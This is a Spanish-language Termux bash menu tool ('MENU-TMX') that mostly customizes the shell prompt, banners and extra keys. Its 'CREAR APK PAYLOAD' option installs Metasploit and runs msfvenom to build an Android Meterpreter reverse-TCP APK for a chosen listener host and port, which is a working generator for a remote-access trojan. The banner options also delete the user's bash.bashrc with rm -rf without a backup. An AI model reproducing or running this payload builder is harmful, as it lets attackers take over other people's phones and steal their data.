}#creard by:Hacking-Eam
#menu-tmx
#colores
source $HOME/MENU-TMX/BOT/color.sh
#
#
banner(){
bash $HOME/MENU-TMX/BOT/.banner.sh

}


MENU(){
clear
banner
echo
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}01${amarillo} "AÑADIR EXTRA-KEYS"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}02${amarillo} "CREAR APK PAYLOAD"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}03${amarillo} "PERSONALIZAR EL SIMBOLO DE PESO"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}04${amarillo} "PERSONALIZAR INICIO DE TERMUX"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}05${amarillo} "INFO"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}06${amarillo} "EXIT"
echo
read -p $'\e[1;34mM \e[1;37mE \e[1;33mN \e[1;35mU \e[1;37m- \e[1;34mT \e[1;37mM \e[1;33mX \e[1;37m: ' option
if [[ $option == 1 || $option == 01 ]]; then
EXTRA-KEYS
elif [[ $option == 2 || $option == 02 ]]; then
PAYLOAD
elif [[ $option == 3 || $option == 03 ]]; then
SIGNO
elif [[ $option == 4 || $option == 04 ]]; then
LOGOS
elif [[ $option == 5 || $option == 0 ]]; then
info
elif [[ $option == 6 || $option == 06 ]]; then
exit 1
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
MENU
fi
}

EXTRA-KEYS(){
clear
banner
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}01${amarillo} "EXTRA-KEYS 1"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}02${amarillo} "EXTRA-KEYS 2"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}03${amarillo} "VOLVER"
echo
read -p $'\e[1;34mM \e[1;37mE \e[1;33mN \e[1;35mU \e[1;37m- \e[1;34mT \e[1;37mM \e[1;33mX \e[1;37m: ' option
case $option in

1) cd $HOME/MENU-TMX/.Menusites/EXTRA-KEYS1/
	bash EXTRA-KEYS1.sh
	;;
01) cd $HOME/MENU-TMX/.Menusites/EXTRA-KEYS1/
	bash EXTRA-KEYS1.sh
	;;
2) cd $HOME/MENU-TMX/.Menusites/EXTRA-KEYS2/
	bash EXTRA-KEYS2.sh
	;;
02) cd $HOME/MENU-TMX/.Menusites/EXTRA-KEYS2/
	bash EXTRA-KEYS2.sh
	;;
99) MENU
	;;
*) echo -e "\033[1;31mERROR "
        sleep 0.5
        EXTRA-KEYS
            ;;

esac
}

PAYLOAD(){
clear
banner
 echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "Instalando metasploit;";
pkg install -y metasploit > /dev/null 2>&1
clear;
echo -e "\e[0m\e[1m"
echo "esta Es Tu Ip";
echo;
curl ifconfig.me
echo;
echo -e -n "ingresen El Lhost: ";
read host;
echo;
echo -e -n "ingrese El lport ";
read lport;
echo;
echo -e -n "ingrese El nombre de la.apk ";
read name;
echo;
echo "generando Payload ";
sleep 2;
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$lport R > /storage/emulated/0/$name.apk;
echo;
echo "payload Generado Con Exito";
cd;
termux-open cd; cd /storage/emulated/0/$name.apk;
echo;

echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}99${amarillo} "VOLVER"
read -p $'\e[1;34mM \e[1;37mE \e[1;33mN \e[1;35mU \e[1;37m- \e[1;34mT \e[1;37mM \e[1;33mX \e[1;37m: ' option
case $option in

99) MENU
        ;;
*) echo -e "\033[1;31mERROR "
        sleep 0.5
        PAYLOAD
            ;;
esac
}


SIGNO(){
clear
banner
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}01${amarillo} "[$]••>"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}02${amarillo} "{$(date)}\e[0m\e[1;36m[\j]\e[0m\e[1;32m<$?>\e[0m\e[2;36m(\u\e[0m@"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}03${amarillo} "\e[1;32mu0_a97@localhost"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}04${amarillo} "\e[1;0m\e[32mu0_a97 \e[1;34m~/MENU-TMX \e[1;32m$"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}05${amarillo} "\e[1;0m\e[31mu0_a97 \e[1;34m~/MENU-TMX \e[1;0m\e[31m$"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}06${amarillo} "\e[32m:\e[1;31m~/MENU-TMX$"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}99${amarillo} "VOLVER"
echo 
read -p $'\e[1;34mM \e[1;37mE \e[1;33mN \e[1;35mU \e[1;37m- \e[1;34mT \e[1;37mM \e[1;33mX \e[1;37m: ' option

if [[ $option == 1 || $option == 01 ]]; then
cd
cd ../usr/etc
echo "#PS1 modificado " >> bash.bashrc
echo "PS1='[$]••> '" >> bash.bashrc
echo "#toca CTRL + x + y para salir " >> bash.bashrc
echo -e "se a modificado"
sleep 9
echo -e ${verde}•${blnaco}"instalando tu PS1..."
sleep 9
echo -e ${verde}•${blnaco}"PS1 instalados con exito..."
SIGNO
elif [[ $option == 2 || $option == 02 ]]; then
cd
cd ../usr/etc
echo "#PS1 modificado " >> bash.bashrc
echo "PS1='\e[1m\e[33m{$(date)}\e[0m\e[1;36m[\j]\e[0m\e[1;32m<$?>\e[0m\e[2;36m(\u\e[0m@\e[1;34m\w)\e[0m\n\$> '" >> bash.bashrc
echo "#toca CTRL + x + y para salir " >> bash.bashrc
sleep 9
echo -e ${verde}•${blnaco}"instalando tu PS1..."
sleep 9
echo -e ${verde}•${blnaco}"PS1 instalados con exito..."
SIGNO
elif [[ $option == 3 || $option == 03 ]]; then
cd
cd ../usr/etc
echo "#PS1 modificado " >> bash.bashrc
echo "PS1='\[\e[1;32m\][\u@\h \W]\$\[\e[0m\] '" >> bash.bashrc
echo "#toca CTRL + x + y para salir " >> bash.bashrc
sleep 9
echo -e ${verde}•${blnaco}"instalando tu PS1..."
sleep 9
echo -e ${verde}•${blnaco}"PS1 instalados con exito..."
SIGNO
elif [[ $option == 4 || $option == 04 ]]; then
cd 
cd ../usr/etc
echo "#PS1 modificado " >> bash.bashrc
echo "PS1='\[\e[0;32m\]\u\[\e[m\] \[\e[1;34m\]\w\[\e[m\] \[\e[1;32m\]\$\[\e[m\]\[\e[1;37m\] '" >> bash.bashrc
echo "#toca CTRL + x + y para salir " >> bash.bashrc
sleep 9
echo -e ${verde}•${blnaco}"instalando tu PS1..."
sleep 9
echo -e ${verde}•${blnaco}"PS1 instalados con exito..."
SIGNO
elif [[ $option == 5 || $option == 05 ]]; then
cd 
cd ../usr/etc
echo "#PS1 modificado " >> bash.bashrc
echo "PS1='\[\e[0;31m\]\u\[\e[m\] \[\e[1;34m\]\w\[\e[m\] \[\e[0;31m\]\$\[\e[m\]\[\e[0;32m\] '" >> bash.bashrc
echo "#toca CTRL + x + y para salir " >> bash.bashrc
sleep 9
echo -e ${verde}•${blnaco}"instalando tu PS1..."
sleep 9
echo -e ${verde}•${blnaco}"PS1 instalados con exito..."
SIGNO
elif [[ $option == 6 || $option == 06 ]]; then
cd 
cd ../usr/etc
echo "#PS1 modificado " >> bash.bashrc
echo "PS1='\[\033[1;33;1;32m\]:\[\033[1;31m\]\w$ \[\033[0m\]\[\033[0m\]' " >> bash.bashrc
echo "#toca CTRL + x + y para salir " >> bash.bashrc
sleep 9
echo -e ${verde}•${blnaco}"instalando tu PS1..."
sleep 9
echo -e ${verde}•${blnaco}"PS1 instalados con exito..."
SIGNO
elif [[ $option = 99 ]]; then
MENU
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
SIGNO
fi

}

LOGOS(){
clear
banner
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}01${amarillo} "EYES"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}02${amarillo} "LAGARTO"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}03${amarillo} "ROBOOT"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}04${amarillo} "MURCIELAGO"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}05${amarillo} "clasico"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}06${amarillo} "HALOWE"
echo -e ${azul}[${rojo}+${azul}]${cyan}~${blanco}99${amarillo} "VOLVER"
echo
read -p $'\e[1;34mM \e[1;37mE \e[1;33mN \e[1;35mU \e[1;37m- \e[1;34mT \e[1;37mM \e[1;33mX \e[1;37m: ' option

if [[ $option == 1 || $option == 01 ]]; then
clear
banner
echo -e ${cyan}"      INSTALANDO REQUISITOS..."

echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando figlet..."
pkg install -y figlet > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando toilet..."
apt install -y toilet > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando cowsay..."
apt install -y cowsay > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando nano..."
apt install -y nano > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando ruby..."
apt install -y ruby > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando lolcat..."
gem install lolcat > /dev/null 2>&1
clear
cd
cd ../usr/etc
rm -rf bash.bashrc
eyes
echo
echo
echo
echo -e -n "\e[1;31m[\e[1;33m=\e[1;31m] \e[33mCual es tu  \e[31mNombre \e[33mBanner\e[32m : "
read varbanner
echo
echo -e -n "\e[1;31m[\e[1;33m=\e[1;31m] \e[33mCual es tu palabra \e[31clave Nombre\e[32m : "
read varcowsay
echo
echo -e -n "\e[1;31m[\e[1;33m=\e[1;31m] \e[33mCual es tu nombre de \e[31mPS1\e[32m : "
read nombre
echo
echo  "cowsay -f eyes $varcowsay | lolcat" > C0w54y.txt
echo "toilet -f big '$varbanner' -F gay | lolcat" > 84nn3r.txt
echo "PS1='$nombre••>'" >> bash.bashrc
echo
#CARPETA RAIZ
echo "clear" > cl34r.txt
cat "cl34r.txt" >> /data/data/com.termux/files/usr/etc/bash.bashrc
cat "C0w54y.txt" >> /data/data/com.termux/files/usr/etc/bash.bashrc
echo
cat "84nn3r.txt" >> /data/data/com.termux/files/usr/etc/bash.bashrc
sleep 9
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m instalndo tu banner..."
sleep 9
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m tu banner acido instalado..."
sleep 9
echo
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m instalando tu PS1..."
sleep 9
echo -e "\e[1;35m[\e[1;33m!\e[1;31m] \e[1;33m banner y PS1 instalados..."
sleep 9
echo
echo
echo -e "\e[1;31m[\e[1;33m=\e[1;31m] \e[1;31m EXIT "
sleep 0.5
elif [[ $option == 2 || $option == 02 ]]; then
clear
banner
echo -e ${cyan}"      INSTALANDO REQUISITOS..."

echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando figlet..."
pkg install -y figlet > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando ruby..."
apt install -y ruby > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando lolcat..."
gem install lolcat > /dev/null 2>&1
clear
echo
lagarto
echo -e -n "\e[1;31m[\e[1;33m=\e[1;31m] \e[33mCual es tu  \e[31mNombre \e[33mBanner\e[32m  : "
read NOMBRE
echo -e -n "\e[1;31m[\e[1;33m=\e[1;31m] \e[33mCual es tu nombre de \e[31mPS1\e[32m   : "
read nombre
echo
cd
cd ../usr/etc
rm -rf bash.bashrc
echo "clear " >> bash.bashrc
echo "#LOGI " >> bash.bashrc
echo " bash $HOME/MENU-TMX/.Menusites/LOGOS/logo1.sh " >> bash.bashrc
echo "figlet -f big '     $NOMBRE'  | lolcat" >> bash.bashrc
echo "PS1='$nombre \n\e[1;36m[\w]-> \e[0m'" >> bash.bashrc
echo "#toca CTRL + x + y para salir " >> bash.bashrc
sleep 9
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m instalndo tu banner..."
sleep 9
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m tu banner acido instalado..."
sleep 9
echo
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m instalando tu PS1..."
sleep 9
echo -e "\e[1;35m[\e[1;33m!\e[1;31m] \e[1;33m banner y PS1 instalados..."
sleep 9
echo
echo
echo -e "\e[1;31m[\e[1;33m=\e[1;31m] \e[1;31m EXIT "
sleep 0.5
elif [[ $option == 3 || $option == 03 ]]; then
clear
banner
echo -e ${cyan}"      INSTALANDO REQUISITOS..."

echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando figlet..."
pkg install -y figlet > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando ruby..."
apt install -y ruby > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando lolcat..."
gem install lolcat > /dev/null 2>&1
clear
roboot
echo
echo -e -n "\e[1;31m[\e[1;33m=\e[1;31m] \e[33mCual es tu  \e[31mNombre \e[33mBanner\e[32m : "
read NOMBRE
echo -e -n "\e[1;31m[\e[1;33m=\e[1;31m] \e[33mCual es tu nombre de \e[31mPS1\e[32m  : "
read nombre
echo
cd
cd ../usr/etc
rm -rf bash.bashrc
echo "clear" >> bash.bashrc
echo "#LOGI " >> bash.bashrc
echo " python $HOME/MENU-TMX/.Menusites/LOGOS/logo2.py " >> bash.bashrc
echo "figlet -f big '   $NOMBRE'  | lolcat" >> bash.bashrc
echo "PS1='\e[1;32m[\e[1;31m$nombre%#\e[1;34m[\w]=> \e[0m'" >> bash.bashrc
echo "#toca CTRL + x + y para salir " >> bash.bashrc
sleep 9
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m instalndo tu banner..."
sleep 9
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m tu banner acido instalado..."
sleep 9
echo
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m instalando tu PS1..."
sleep 9
echo -e "\e[1;35m[\e[1;33m!\e[1;31m] \e[1;33m banner y PS1 instalados..."
sleep 9
echo
echo
echo -e "\e[1;31m[\e[1;33m=\e[1;31m] \e[1;31m EXIT "
sleep 0.5
elif [[ $option == 4 || $option == 04 ]]; then
clear
banner
echo -e ${cyan}"      INSTALANDO REQUISITOS..."

echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando figlet..."
pkg install -y figlet > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando ruby..."
apt install -y ruby > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando lolcat..."
gem install lolcat > /dev/null 2>&1
clear
murci
echo
echo -e -n "\e[1;31m[\e[1;33m=\e[1;31m] \e[33mCual es tu  \e[31mNombre \e[33mBanner\e[32m : "
read NOMBRE
echo -e -n "\e[1;31m[\e[1;33m=\e[1;31m] \e[33mCual es tu nombre de \e[31mPS1\e[32m  : "
read nombre
echo
cd
cd ../usr/etc
rm -rf bash.bashrc
echo "clear" >> bash.bashrc
echo "#LOGI " >> bash.bashrc
echo " bash $HOME/MENU-TMX/.Menusites/LOGOS/logo4.sh " >> bash.bashrc
echo " echo -e '\e[1;0m '" >> bash.bashrc
echo "figlet -f small '   $NOMBRE'  | lolcat" >> bash.bashrc
echo "PS1='\e[3m $nombre\e[0m\e[34m[\w]~~> \e[0m'" >> bash.bashrc
echo "#toca CTRL + x + y para salir " >> bash.bashrc
sleep 9
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m instalndo tu banner..."
sleep 9
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m tu banner acido instalado..."
sleep 9
echo
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m instalando tu PS1..."
sleep 9
echo -e "\e[1;35m[\e[1;33m!\e[1;31m] \e[1;33m banner y PS1 instalados..."
sleep 9
echo
echo
echo -e "\e[1;31m[\e[1;33m=\e[1;31m] \e[1;31m EXIT "
sleep 0.5
elif [[ $option == 5 || $option == 05 ]]; then
clear
banner
echo -e ${cyan}"      INSTALANDO REQUISITOS..."

echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando figlet..."
pkg install -y figlet > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando ruby..."
apt install -y ruby > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando lolcat..."
gem install lolcat > /dev/null 2>&1
clear
cla
echo
echo -e -n "\e[1;31m[\e[1;33m=\e[1;31m] \e[33mCual es tu  \e[31mNombre \e[33mBanner\e[32m : "
read NOMBRE
echo -e -n "\e[1;31m[\e[1;33m=\e[1;31m] \e[33mCual es tu nombre de \e[31mPS1\e[32m  : "
read nombre

echo
cd
cd ../usr/etc
rm -rf bash.bashrc
echo "clear" >> bash.bashrc
echo "#LOGI " >> bash.bashrc
echo " bash $HOME/MENU-TMX/.Menusites/LOGOS/logo3.sh " >> bash.bashrc
echo "figlet -f big '    $NOMBRE'  | lolcat" >> bash.bashrc
echo "PS1='\e[0m\e[3m \e[33m$(date)\n \e[91m$nombre->  \e[0m'" >> bash.bashrc
echo "#toca CTRL + x + y para salir " >> bash.bashrc
sleep 9
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m instalndo tu banner..."
sleep 9
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m tu banner acido instalado..."
sleep 9
echo
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m instalando tu PS1..."
sleep 9
echo -e "\e[1;35m[\e[1;33m!\e[1;31m] \e[1;33m banner y PS1 instalados..."
sleep 9
echo
echo
echo -e "\e[1;31m[\e[1;33m=\e[1;31m] \e[1;31m EXIT "
sleep 0.5
elif [[ $option == 6 || $option == 06 ]]; then
clear
banner
echo -e ${cyan}"      INSTALANDO REQUISITOS..."

echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando figlet..."
pkg install -y figlet > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando ruby..."
apt install -y ruby > /dev/null 2>&1
echo -e ${amarillo}[${morado}√${amarillo}]${cyan} "instalando lolcat..."
gem install lolcat > /dev/null 2>&1
clear
halo
echo
echo -e -n "\e[1;31m[\e[1;33m=\e[1;31m] \e[33mCual es tu  \e[31mNombre \e[33mBanner\e[32m : "
read NOMBRE
echo -e -n "\e[1;31m[\e[1;33m=\e[1;31m] \e[33mCual es tu nombre de \e[31mPS1\e[32m : "
read nombre
echo
cd
cd ../usr/etc
rm -rf bash.bashrc
echo "clear" >> bash.bashrc
echo "#LOGI " >> bash.bashrc
echo " bash $HOME/MENU-TMX/.Menusites/LOGOS/logo5.sh " >> bash.bashrc
echo "figlet -f script '  $NOMBRE'  | lolcat" >> bash.bashrc
echo "PS1='\e[3m $nombre\e[0m\e[34m[\w]~~>\e[0m'" >> bash.bashrc
echo "#toca CTRL + x + y para salir " >> bash.bashrc         
sleep 9 
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m instalndo tu banner..."
sleep 9
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m tu banner acido instalado..."
sleep 9
echo
echo -e "\e[1;31m[\e[1;33m!\e[1;31m] \e[1;33m instalando tu PS1..."
sleep 9
echo -e "\e[1;35m[\e[1;33m!\e[1;31m] \e[1;33m banner y PS1 instalados..."
sleep 9
echo
echo
echo -e "\e[1;31m[\e[1;33m=\e[1;31m] \e[1;31m EXIT "
sleep 0.5
elif [[ $option = 99 ]]; then
MENU
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
LOGOS
fi
}

eyes(){
cat << "EOF"
				    .::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
        "*$bd$$$$      '*$$$$$$$$$$$o+#"
             """"          """""""
EOF
}

lagarto(){
cat << "EOF"
			 .^^^\ ../~/\       .==...==.
                       .^\ /\  \    ^-------^^ O    O,
                      / \  \/    ---         ,..++---,
                     / \_\-          _,v.v^V^ ,/\^^^/
                    | \/       /^v^V^   _,.-^^  .;+^
                     \-\   (   \..,+-=~^   .-+/^
                      \--.__________.--+'^^
                   ...^--.__________.---^^^^~+._
  _            _,=^\                            ".
  \'\.       .^             FFFfffffFFF           '
   \-/\     /  \             FF      FF   )   /    \
    \-/\   | -      /        FF           )^`\,... |
    /\-\)  | ,,../^^\        FFffFF       /  /     \
   /\.-\)  |^     \  \       FF          /  (      )
  /\. \/   (     \/  /\      FF         /    \/_/_/
 /==)-/\_   \_\_\/ / |      FFFF       )|
(=== /. /^^^~~~~~^^\  \               ) |
(/:/:/ /. /  /  /   \  ^+..........,^^  /
 \/:/:(:.(:.(:.(  (  \,             ,.;|
  \$$(:(:(::(::(::(::: ^^""""""""""^  /\
   ^=U$$$$$Sb\;:\;:\:''"*********+++_/ \)
       ^"=*UUU$$$$$++ /$$$$&&PP!*=/^\ \/
                  |++|            \+ + \_ _
                 _/ . \_           \ .  ___>
              <(^ /  |__)>          `--.___>
                \/^\/
EOF
}

murci(){
cat << "EOF"
 #
 ##
 ###
  ####
   #####
   #######
    #######
    ########
    ########
    #########
    ##########
   ############
 ##############
################
 ################
   ##############
    ##############                                              ####
    ##############                                           #####
     ##############                                      #######
     ##############                                 ###########
     ###############                              #############
     ################                           ##############
    #################      #                  ################
    ##################     ##    #           #################
   ####################   ###   ##          #################
        ################  ########          #################
         ################  #######         ###################
           #######################       #####################
            #####################       ###################
              ############################################
               ###########################################
               ##########################################
                ########################################
                ########################################
                 ######################################
                 ######################################
                  ##########################      #####
                  ###  ###################           ##
                  ##    ###############
                  #     ##  ##########
                            ##    ###
                                  ###
                                  ##
                                  #


EOF
}

roboot(){
cat << "EOF"
                                                /[-])//  ___
                                           __ --\ `_/~--|  / \
                                         /_-/~~--~~ /~~~\_\ /\
                                         |  |___|===|_-- | \ \ \
        MENU-TMX       _/~~~~~~~~|~~\,   ---|---\___/----|  \/\-\
CREADY BY:EDISON ANTIL ~\________|__/   / // \__ |  ||  / | |   | |
                                ,~-|~~~~~\--, | \|--|/~|||  |   | |
                                [3-|____---~~ _--'==;/ _,   |   |_|
                                            /   /\__|_/  \  \__/--/
                                           /---/_\  -___/ |  /,--|
                                           /  /\/~--|   | |  \///
                                          /  / |-__ \    |/
                                        |--/ /      |-- | \
                                       \^~~\/\      \   \/- _
                                        \    |  \     |~~\~~| \
                                         \    \  \     \   \  | \
                                          \    \ |     \   \    \
                                           |~~|\/\|     \   \   |
                                          |   |/         \_--_- |\
                                          |  /            /   |/\/
                                          ~~             /  /
                                                        |__/
EOF
}

cla(){
cat << "EOF"
	
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '

EOF
}

halo(){
echo -e "\e[3m "
cat << "EOF"
                             @@@
                             @@@
                              @@@                       H A P P Y
                              @@@
                      @@@@@@@@@@@@@@@@@@@@@@         H A L L O W E E N
                    @@@@@@@@@@@@@@@@@@@@@@@@@@
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@
              @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@
            @@@@@@@@@@     @@@@@@@@@@@@     @@@@@@@@@@
           @@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@
            @@@@@@@@  @@ @@ @@ @@ @@ @@ @@ @  @@@@@@@@
              @@@@@@@                        @@@@@@@
                @@@@@@  @@ @@ @@ @@ @@ @@ @ @@@@@@
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                    @@@@@@@@@@@@@@@@@@@@@@@@@@
                      @@@@@@@@@@@@@@@@@@@@@@

EOF
}

info(){
clear
banner
echo -e ${verde}    		"INFORMASION"${ter}
termux-open https://chat.whatsapp+56937637766.com
echo
sleep 0.8
MENU
}
MENU
